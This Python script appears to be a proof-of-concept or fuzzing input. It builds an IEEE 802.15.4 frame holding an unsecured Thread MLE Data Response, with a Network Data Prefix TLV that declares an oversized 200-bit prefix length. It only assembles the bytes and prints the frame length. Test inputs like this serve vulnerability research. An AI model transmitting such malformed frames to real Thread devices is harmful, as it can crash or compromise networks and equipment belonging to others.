import struct

# Create IEEE 802.15.4 frame with MLE Data Response message containing malformed Network Data

# IEEE 802.15.4 Frame Control Field (FCF)
# Bits: Frame Type (3) | Security (1) | Frame Pending (1) | Ack Request (1) | PAN ID Compress (1) | Reserved (3) | Dest Addr Mode (2) | Frame Version (2) | Src Addr Mode (2)
# Frame Type: 001 (Data frame)
# Security: 0 (no security for simplicity)
# Dest Addr Mode: 10 (short address)
# Src Addr Mode: 10 (short address)
# Frame Version: 01 (IEEE 802.15.4-2006)

fcf = 0x8841  # Data frame, short dst/src addresses
seq_num = 0x01
dst_pan = 0xface
dst_addr = 0xfffe
src_pan = 0xface  # Will be omitted if PAN ID compression is used
src_addr = 0x1234

# Build MAC header (without security, with PAN ID compression)
fcf_compressed = 0x8861  # With PAN ID compression bit
mac_header = struct.pack('<HBHHH', fcf_compressed, seq_num, dst_pan, dst_addr, src_addr)

# MLE Header (for unencrypted testing - normally MLE uses security)
# Security Suite: 0 (no security - this is not standard but for testing)
# Command: 8 (Data Response)
mle_security_suite = 0x00
mle_command = 0x08

mle_header = bytes([mle_security_suite, mle_command])

# MLE TLVs
# We need Leader Data TLV and Network Data TLV

# Leader Data TLV (Type 11, Length 8)
leader_data_tlv_type = 11
leader_data_tlv_len = 8
leader_data = bytes([
    0x00, 0x00, 0x00, 0x00,  # Partition ID
    0x01,  # Weighting
    0x01,  # Data Version
    0x01,  # Stable Data Version
    0x01   # Leader Router ID
])
leader_data_tlv = bytes([leader_data_tlv_type, leader_data_tlv_len]) + leader_data

# Network Data TLV (Type 12)
# Inside: Prefix TLV with oversized prefix length
prefix_length = 200
domain_id = 0
bitvector_bytes = (prefix_length + 7) // 8  # 25 bytes

prefix_tlv_type = 0x03  # Prefix TLV with stable bit
prefix_data_length = 1 + 1 + bitvector_bytes  # domainId + prefixLen + prefix bytes
prefix_bytes = b'\xfd\x00' * 12 + b'\x00'  # 25 bytes

network_data_content = bytes([
    prefix_tlv_type,
    prefix_data_length,
    domain_id,
    prefix_length,
]) + prefix_bytes

network_data_tlv_type = 12
network_data_tlv_len = len(network_data_content)
network_data_tlv = bytes([network_data_tlv_type, network_data_tlv_len]) + network_data_content

# Assemble MLE inputs
mle_payload = mle_header + leader_data_tlv + network_data_tlv

# Assemble complete frame
frame = mac_header + mle_payload

print(f"Frame length: {len(frame)}")
